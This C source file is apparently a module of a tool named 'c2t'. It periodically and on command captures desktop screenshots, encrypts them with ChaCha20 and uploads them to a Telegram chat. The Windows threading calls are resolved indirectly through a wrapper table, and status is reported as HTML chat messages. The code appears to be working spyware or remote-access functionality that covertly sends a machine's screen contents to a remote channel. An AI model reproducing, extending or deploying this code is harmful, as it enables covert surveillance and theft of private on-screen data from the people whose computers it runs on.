/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "screenshot_output.h"
#include "screenshot.h"
#include "../config/config.h"
#include "../logging/logging.h"
#include "../telegram/telegram.h"
#include "../telegram/telegram_platform.h"

#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifndef _WIN32
#include <errno.h>
#include <pthread.h>
#include <sys/time.h>
#else
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "../win32/win32_api.h"

static void c2t_InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.InitializeCriticalSection)
    g_c2t_win32.InitializeCriticalSection(lpCriticalSection);
}
static void c2t_EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.EnterCriticalSection)
    g_c2t_win32.EnterCriticalSection(lpCriticalSection);
}
static void c2t_LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.LeaveCriticalSection)
    g_c2t_win32.LeaveCriticalSection(lpCriticalSection);
}
static void c2t_DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.DeleteCriticalSection)
    g_c2t_win32.DeleteCriticalSection(lpCriticalSection);
}
static HANDLE c2t_CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,
                               SIZE_T dwStackSize,
                               LPTHREAD_START_ROUTINE lpStartAddress,
                               LPVOID lpParameter, DWORD dwCreationFlags,
                               LPDWORD lpThreadId) {
  c2t_win32_api_init();
  if (g_c2t_win32.CreateThread)
    return g_c2t_win32.CreateThread(lpThreadAttributes, dwStackSize,
                                    lpStartAddress, lpParameter,
                                    dwCreationFlags, lpThreadId);
  return NULL;
}
static DWORD c2t_WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
  c2t_win32_api_init();
  if (g_c2t_win32.WaitForSingleObject)
    return g_c2t_win32.WaitForSingleObject(hHandle, dwMilliseconds);
  return WAIT_FAILED;
}
static BOOL c2t_CloseHandle(HANDLE hObject) {
  c2t_win32_api_init();
  if (g_c2t_win32.CloseHandle)
    return g_c2t_win32.CloseHandle(hObject);
  return FALSE;
}
static VOID c2t_InitializeConditionVariable(PCONDITION_VARIABLE ConditionVariable) {
  c2t_win32_api_init();
  if (g_c2t_win32.InitializeConditionVariable)
    g_c2t_win32.InitializeConditionVariable(ConditionVariable);
}
static BOOL c2t_SleepConditionVariableCS(PCONDITION_VARIABLE ConditionVariable,
                                        PCRITICAL_SECTION CriticalSection,
                                        DWORD dwMilliseconds) {
  c2t_win32_api_init();
  if (g_c2t_win32.SleepConditionVariableCS)
    return g_c2t_win32.SleepConditionVariableCS(ConditionVariable,
                                                 CriticalSection, dwMilliseconds);
  return FALSE;
}
static VOID c2t_WakeConditionVariable(PCONDITION_VARIABLE ConditionVariable) {
  c2t_win32_api_init();
  if (g_c2t_win32.WakeConditionVariable)
    g_c2t_win32.WakeConditionVariable(ConditionVariable);
}

#define InitializeCriticalSection c2t_InitializeCriticalSection
#define EnterCriticalSection c2t_EnterCriticalSection
#define LeaveCriticalSection c2t_LeaveCriticalSection
#define DeleteCriticalSection c2t_DeleteCriticalSection
#define CreateThread c2t_CreateThread
#define WaitForSingleObject c2t_WaitForSingleObject
#define CloseHandle c2t_CloseHandle
#define InitializeConditionVariable c2t_InitializeConditionVariable
#define SleepConditionVariableCS c2t_SleepConditionVariableCS
#define WakeConditionVariable c2t_WakeConditionVariable
#endif

static atomic_int is_paused = 0;
static atomic_uint_fast64_t total_captures = 0;
static atomic_uint_fast64_t total_bytes = 0;
static atomic_size_t screenshot_interval_seconds = 0;
static atomic_int current_format = (int)C2T_IMAGE_FORMAT_PNG;
static atomic_int current_quality = 85;
static atomic_int stopping = 0;
static atomic_int capture_in_progress = 0;

static int initialized = 0;
static int worker_running = 0;

#ifdef _WIN32
static CRITICAL_SECTION mutex;
static CONDITION_VARIABLE cond_var;
static HANDLE worker_thread = NULL;
#else
static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t cond_var = PTHREAD_COND_INITIALIZER;
static pthread_t worker_thread;
#endif

static void format_metric_bytes(uint64_t b, char *out, size_t cap) {
  if (!out || cap == 0) return;
  if (b < 1024) {
    snprintf(out, cap, "%llu B", (unsigned long long)b);
  } else if (b < 1024 * 1024) {
    snprintf(out, cap, "%.1f KB (%llu B)", (double)b / 1024.0, (unsigned long long)b);
  } else {
    snprintf(out, cap, "%.2f MB (%llu B)", (double)b / (1024.0 * 1024.0), (unsigned long long)b);
  }
}

#include "../crypto/crypto.h"
#include "screenshot_encoder.h"

int screenshot_fit_telegram_photo(void **image_data, size_t *image_size,
                                  c2t_image_format_t *format, int quality) {
  if (!image_data || !*image_data || !image_size || !format)
    return 0;
  if (*image_size <= C2T_TELEGRAM_MAX_PHOTO_BYTES)
    return 1;

  c2t_image_format_t targets[7];
  int qualities[7];
  size_t target_count = 0;
  if (*format == C2T_IMAGE_FORMAT_PLAIN) {
    targets[target_count] = C2T_IMAGE_FORMAT_PNG;
    qualities[target_count++] = quality;
  }

  int jpeg_quality = quality;
  if (jpeg_quality <= 0 || jpeg_quality > 85)
    jpeg_quality = 85;
  static const int fallback_qualities[] = {75, 60, 45, 30, 15};
  targets[target_count] = C2T_IMAGE_FORMAT_JPG;
  qualities[target_count++] = jpeg_quality;
  for (size_t i = 0;
       i < sizeof(fallback_qualities) / sizeof(fallback_qualities[0]); ++i) {
    if (fallback_qualities[i] >= jpeg_quality)
      continue;
    targets[target_count] = C2T_IMAGE_FORMAT_JPG;
    qualities[target_count++] = fallback_qualities[i];
  }

  for (size_t i = 0; i < target_count; ++i) {
    void *candidate = nullptr;
    size_t candidate_size = 0;
    if (!screenshot_transcode_image(*image_data, *image_size, targets[i],
                                    qualities[i], &candidate,
                                    &candidate_size))
      continue;
    if (candidate_size <= C2T_TELEGRAM_MAX_PHOTO_BYTES) {
      c2t_secure_zero(*image_data, *image_size);
      screenshot_free_data(*image_data);
      *image_data = candidate;
      *image_size = candidate_size;
      *format = targets[i];
      c2t_log_info("screenshot",
                   "Oversized Telegram photo re-encoded as %s at %d%% "
                   "(%llu bytes)",
                   screenshot_format_to_string(*format), qualities[i],
                   (unsigned long long)candidate_size);
      return 1;
    }
    c2t_secure_zero(candidate, candidate_size);
    screenshot_free_data(candidate);
  }

  return 0;
}

int screenshot_capture_display_and_send(const char *display_target, const char *caption) {
  void *image_data = nullptr;
  size_t image_size = 0;
  c2t_image_format_t format = screenshot_get_format();
  const char *mime_type = screenshot_format_mime(format);
  const char *filename = screenshot_format_filename(format);

  char target[64] = "all";
  if (display_target && *display_target) {
    snprintf(target, sizeof(target), "%s", display_target);
  } else {
    screenshot_get_selected_display(target, sizeof(target));
  }

  /* A periodic capture and an on-demand command may arrive together. Keeping
   * only one capture in flight avoids duplicate desktop/API work and caps the
   * screenshot subsystem at one frame buffer. */
  int expected_idle = 0;
  if (!atomic_compare_exchange_strong_explicit(
          &capture_in_progress, &expected_idle, 1, memory_order_acquire,
          memory_order_relaxed)) {
    c2t_log_warning("screenshot",
                    "Capture request for '%s' skipped: another capture is in progress",
                    target);
    return 0;
  }

  if (!screenshot_capture_display(target, &image_data, &image_size, &mime_type, &filename)) {
    c2t_log_warning("screenshot", "Screenshot capture failed for target '%s'", target);
    atomic_store_explicit(&capture_in_progress, 0, memory_order_release);
    return 0;
  }

  int send_as_photo = mime_type &&
                      (strcmp(mime_type, "image/png") == 0 ||
                       strcmp(mime_type, "image/jpeg") == 0 ||
                       strcmp(mime_type, "image/jpg") == 0);
  if (send_as_photo && image_size > C2T_TELEGRAM_MAX_PHOTO_BYTES) {
    size_t original_size = image_size;
    if (screenshot_fit_telegram_photo(&image_data, &image_size, &format,
                                      screenshot_get_quality())) {
      mime_type = screenshot_format_mime(format);
      filename = screenshot_format_filename(format);
      c2t_log_info("screenshot",
                   "Telegram photo reduced from %llu to %llu bytes",
                   (unsigned long long)original_size,
                   (unsigned long long)image_size);
    } else {
      send_as_photo = 0;
      c2t_log_warning(
          "screenshot",
          "Screenshot remains larger than Telegram's 10 MiB photo limit; "
          "sending it as a document");
    }
  }

  c2t_clipboard_source_t source = {0};
  snprintf(source.application, sizeof(source.application), "c2t screenshot");
  if (caption && *caption) {
    snprintf(source.title, sizeof(source.title), "%s", caption);
  } else {
    time_t now = time(nullptr);
    struct tm tm_buf;
#ifdef _WIN32
    localtime_s(&tm_buf, &now);
#else
    localtime_r(&now, &tm_buf);
#endif
    char time_str[64];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", &tm_buf);
    snprintf(source.title, sizeof(source.title),
             "🖥️ Desktop Screenshot [%s] (Display %s)", time_str, target);
  }

  unsigned char nonce[C2T_CRYPTO_NONCE_SIZE];
  if (!c2t_crypto_get_random_bytes(nonce, sizeof(nonce))) {
    c2t_log_error("screenshot", "Failed to generate random crypto nonce for screenshot");
    c2t_secure_zero(image_data, image_size);
    screenshot_free_data(image_data);
    atomic_store_explicit(&capture_in_progress, 0, memory_order_release);
    return 0;
  }

  /* ChaCha20 supports identical input/output buffers. Encrypting the encoded
   * image in place removes a full image-sized allocation and immediately
   * replaces every plaintext byte before the network operation starts. */
  if (!c2t_crypto_encrypt(image_data, image_size, nonce, image_data)) {
    c2t_log_error("screenshot", "ChaCha20 encryption failed for screenshot");
    c2t_secure_zero(image_data, image_size);
    screenshot_free_data(image_data);
    c2t_secure_zero(nonce, sizeof(nonce));
    atomic_store_explicit(&capture_in_progress, 0, memory_order_release);
    return 0;
  }

  size_t attempts = c2t_config_get()->delivery_attempts;
  if (attempts == 0) attempts = 1;
  size_t retry_delay_ms = c2t_config_get()->retry_delay_ms;
  if (retry_delay_ms == 0) retry_delay_ms = 500;

  int send_res = 0;
  if (send_as_photo) {
    send_res = telegram_send_encrypted_photo(image_data, image_size, nonce,
                                            mime_type, filename, &source);
    if (!send_res) {
      c2t_log_warning(
          "screenshot",
          "Photo delivery failed; falling back to document mode...");
      send_res = telegram_send_encrypted_file(image_data, image_size, nonce,
                                             mime_type, filename, &source);
    }
  } else {
    send_res = telegram_send_encrypted_file(image_data, image_size, nonce,
                                           mime_type, filename, &source);
  }

  /* If transient network error and multiple attempts configured, retry once in document mode */
  if (!send_res && attempts > 1) {
    c2t_log_warning("screenshot", "Retrying delivery once...");
#ifdef _WIN32
    Sleep((DWORD)retry_delay_ms);
#else
    struct timespec ts = {.tv_sec = (time_t)(retry_delay_ms / 1000),
                          .tv_nsec = (long)(retry_delay_ms % 1000) * 1000000L};
    nanosleep(&ts, nullptr);
#endif
    send_res = telegram_send_encrypted_file(image_data, image_size, nonce,
                                           mime_type, filename, &source);
  }

  c2t_secure_zero(image_data, image_size);
  screenshot_free_data(image_data);
  c2t_secure_zero(nonce, sizeof(nonce));
  atomic_store_explicit(&capture_in_progress, 0, memory_order_release);

  if (send_res) {
    atomic_fetch_add_explicit(&total_captures, 1, memory_order_relaxed);
    atomic_fetch_add_explicit(&total_bytes, image_size, memory_order_relaxed);
    c2t_log_info("screenshot",
                 "Screenshot successfully delivered via encrypted stream (%llu "
                 "bytes)",
                 (unsigned long long)image_size);
    return 1;
  } else {
    c2t_log_warning("screenshot", "Failed to deliver screenshot to Telegram");
    return 0;
  }
}

int screenshot_capture_and_send(const char *caption) {
  char cur_target[64] = "all";
  screenshot_get_selected_display(cur_target, sizeof(cur_target));
  return screenshot_capture_display_and_send(cur_target, caption);
}

#ifdef _WIN32
static DWORD WINAPI screenshot_worker_func([[maybe_unused]] LPVOID param)
#else
static void *screenshot_worker_func([[maybe_unused]] void *param)
#endif
{
  c2t_log_info("screenshot", "Periodic screenshot worker started (interval=%llu s)",
               (unsigned long long)atomic_load_explicit(&screenshot_interval_seconds,
                                    memory_order_relaxed));

  while (!atomic_load_explicit(&stopping, memory_order_acquire)) {
#ifdef _WIN32
    EnterCriticalSection(&mutex);
    size_t interval = atomic_load_explicit(&screenshot_interval_seconds,
                                           memory_order_relaxed);
    DWORD wait_ms = interval > (size_t)(UINT32_MAX / 1000U)
                        ? (DWORD)UINT32_MAX
                        : (DWORD)(interval * 1000U);
    if (wait_ms == 0) wait_ms = 60000;
    SleepConditionVariableCS(&cond_var, &mutex, wait_ms);
    LeaveCriticalSection(&mutex);
#else
    pthread_mutex_lock(&mutex);
    struct timeval tv;
    gettimeofday(&tv, nullptr);
    struct timespec ts;
    size_t interval = atomic_load_explicit(&screenshot_interval_seconds,
                                           memory_order_relaxed);
    if (interval == 0) interval = 60;
    ts.tv_sec = tv.tv_sec + (time_t)interval;
    ts.tv_nsec = tv.tv_usec * 1000;
    pthread_cond_timedwait(&cond_var, &mutex, &ts);
    pthread_mutex_unlock(&mutex);
#endif

    if (atomic_load_explicit(&stopping, memory_order_acquire)) break;
    if (atomic_load_explicit(&is_paused, memory_order_relaxed)) continue;
    if (atomic_load_explicit(&screenshot_interval_seconds,
                             memory_order_relaxed) == 0) continue;

    (void)screenshot_capture_and_send("📸 Periodic Desktop Screenshot");
  }

  c2t_log_info("screenshot", "Periodic screenshot worker stopped");
#ifdef _WIN32
  return 0;
#else
  return nullptr;
#endif
}

int screenshot_output_init(void) {
  const c2t_config_t *config = c2t_config_get();
  if (config->disable_screenshot) {
    c2t_log_info("screenshot", "Screenshot subsystem disabled by configuration");
    return 1;
  }

  if (initialized) {
    return 1;
  }

#ifdef _WIN32
  InitializeCriticalSection(&mutex);
  InitializeConditionVariable(&cond_var);
#endif

  atomic_store_explicit(&stopping, 0, memory_order_release);
  atomic_store_explicit(&is_paused, 0, memory_order_relaxed);
  atomic_store_explicit(&screenshot_interval_seconds,
                        config->telegram_screenshot_interval_sec,
                        memory_order_relaxed);

  c2t_image_format_t fmt = screenshot_parse_format(config->screenshot_format);
  atomic_store_explicit(&current_format, (int)fmt, memory_order_relaxed);
  int q = config->screenshot_quality;
  if (q <= 0 || q > 100) q = 85;
  atomic_store_explicit(&current_quality, q, memory_order_relaxed);

  if (config->telegram_send_screenshots ||
      atomic_load_explicit(&screenshot_interval_seconds,
                           memory_order_relaxed) > 0) {
    if (atomic_load_explicit(&screenshot_interval_seconds,
                             memory_order_relaxed) == 0) {
      atomic_store_explicit(&screenshot_interval_seconds, 300,
                            memory_order_relaxed); /* Default 5 minutes */
    }
#ifdef _WIN32
    worker_thread = CreateThread(nullptr, 0, screenshot_worker_func, nullptr, 0, nullptr);
    worker_running = (worker_thread != NULL);
#else
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 512 * 1024);
    worker_running = (pthread_create(&worker_thread, &attr, screenshot_worker_func, nullptr) == 0);
    pthread_attr_destroy(&attr);
#endif
    if (!worker_running) {
      c2t_log_warning("screenshot", "Failed to start periodic screenshot worker thread");
    }
  }

  initialized = 1;
  c2t_log_info("screenshot", "Screenshot subsystem initialized (Backend: %s, Format: %s, Quality: %d%%)",
               screenshot_get_backend_name(), screenshot_format_to_string(fmt), q);
  return 1;
}

void screenshot_output_cleanup(void) {
  if (!initialized) return;

  atomic_store_explicit(&stopping, 1, memory_order_release);
#ifdef _WIN32
  EnterCriticalSection(&mutex);
  WakeConditionVariable(&cond_var);
  LeaveCriticalSection(&mutex);
  if (worker_running && worker_thread) {
    WaitForSingleObject(worker_thread, INFINITE);
    CloseHandle(worker_thread);
    worker_thread = NULL;
  }
  DeleteCriticalSection(&mutex);
#else
  pthread_mutex_lock(&mutex);
  pthread_cond_broadcast(&cond_var);
  pthread_mutex_unlock(&mutex);
  if (worker_running) {
    pthread_join(worker_thread, nullptr);
  }
#endif

  worker_running = 0;
  initialized = 0;
  atomic_store_explicit(&stopping, 0, memory_order_release);
  c2t_log_info("screenshot", "Screenshot subsystem shutdown complete");
}

int screenshot_is_paused(void) {
  return atomic_load_explicit(&is_paused, memory_order_relaxed);
}

void screenshot_set_paused(int paused) {
  atomic_store_explicit(&is_paused, paused ? 1 : 0, memory_order_relaxed);
  c2t_log_info("screenshot", "Screenshot capture %s", paused ? "paused" : "resumed");
}

int screenshot_toggle_paused(void) {
  int cur = atomic_load_explicit(&is_paused, memory_order_relaxed);
  int next = !cur;
  atomic_store_explicit(&is_paused, next, memory_order_relaxed);
  c2t_log_info("screenshot", "Screenshot capture toggled to %s", next ? "paused" : "active");
  return next;
}

void screenshot_set_interval(size_t interval_sec) {
  atomic_store_explicit(&screenshot_interval_seconds, interval_sec,
                        memory_order_relaxed);
  if (interval_sec > 0 && !worker_running && initialized) {
#ifdef _WIN32
    worker_thread = CreateThread(nullptr, 0, screenshot_worker_func, nullptr, 0, nullptr);
    worker_running = (worker_thread != NULL);
#else
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 512 * 1024);
    worker_running = (pthread_create(&worker_thread, &attr, screenshot_worker_func, nullptr) == 0);
    pthread_attr_destroy(&attr);
#endif
  }
#ifdef _WIN32
  EnterCriticalSection(&mutex);
  WakeConditionVariable(&cond_var);
  LeaveCriticalSection(&mutex);
#else
  pthread_mutex_lock(&mutex);
  pthread_cond_broadcast(&cond_var);
  pthread_mutex_unlock(&mutex);
#endif
  c2t_log_info("screenshot", "Screenshot interval updated to %llu seconds", (unsigned long long)interval_sec);
}

size_t screenshot_get_interval(void) {
  return atomic_load_explicit(&screenshot_interval_seconds,
                              memory_order_relaxed);
}

c2t_image_format_t screenshot_get_format(void) {
  return (c2t_image_format_t)atomic_load_explicit(&current_format, memory_order_relaxed);
}

void screenshot_set_format(c2t_image_format_t format) {
  atomic_store_explicit(&current_format, (int)format, memory_order_relaxed);
  c2t_log_info("screenshot", "Screenshot image format set to %s", screenshot_format_to_string(format));
}

int screenshot_get_quality(void) {
  return atomic_load_explicit(&current_quality, memory_order_relaxed);
}

void screenshot_set_quality(int quality) {
  if (quality < 1) quality = 1;
  if (quality > 100) quality = 100;
  atomic_store_explicit(&current_quality, quality, memory_order_relaxed);
  c2t_log_info("screenshot", "Screenshot compression quality set to %d%%", quality);
}

uint64_t screenshot_get_total_captures(void) {
  return atomic_load_explicit(&total_captures, memory_order_relaxed);
}

uint64_t screenshot_get_total_bytes(void) {
  return atomic_load_explicit(&total_bytes, memory_order_relaxed);
}

void screenshot_get_status_info(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0) return;

  int paused = screenshot_is_paused();
  int capturing = atomic_load_explicit(&capture_in_progress,
                                       memory_order_acquire);
  uint64_t caps = screenshot_get_total_captures();
  uint64_t b = screenshot_get_total_bytes();
  char b_str[64] = {};
  format_metric_bytes(b, b_str, sizeof(b_str));

  char target_disp[64] = "all";
  screenshot_get_selected_display(target_disp, sizeof(target_disp));

  char timer_info[128] = {};
  size_t interval = screenshot_get_interval();
  if (interval > 0) {
    snprintf(timer_info, sizeof(timer_info), "🟢 <b>Enabled</b> (%llu s)", (unsigned long long)interval);
  } else {
    snprintf(timer_info, sizeof(timer_info), "⚪ <b>Disabled</b> <i>(On-demand only via /shot)</i>");
  }

  c2t_image_format_t fmt = screenshot_get_format();
  int qual = screenshot_get_quality();

  snprintf(buffer, max_len,
           "📸 <b>Screenshot Subsystem Status</b>\n\n"
           "• <b>Backend:</b> <code>%s</code>\n"
           "• <b>Status:</b> %s\n"
           "• <b>Format:</b> <code>%s</code> (Quality: %d%%)\n"
           "• <b>Target Display:</b> <code>%s</code> (%d displays detected)\n"
           "• <b>Periodic Timer:</b> %s\n"
           "• <b>Total Screenshots Captured:</b> %llu\n"
           "• <b>Total Transferred:</b> %s",
           screenshot_get_backend_name(),
           paused ? "⏸️ <b>PAUSED</b>"
                  : (capturing ? "📸 <b>CAPTURING</b>" : "🟢 <b>ACTIVE</b>"),
           screenshot_format_to_string(fmt),
           qual,
           target_disp,
           screenshot_get_display_count(),
           timer_info,
           (unsigned long long)caps,
           b_str);
}
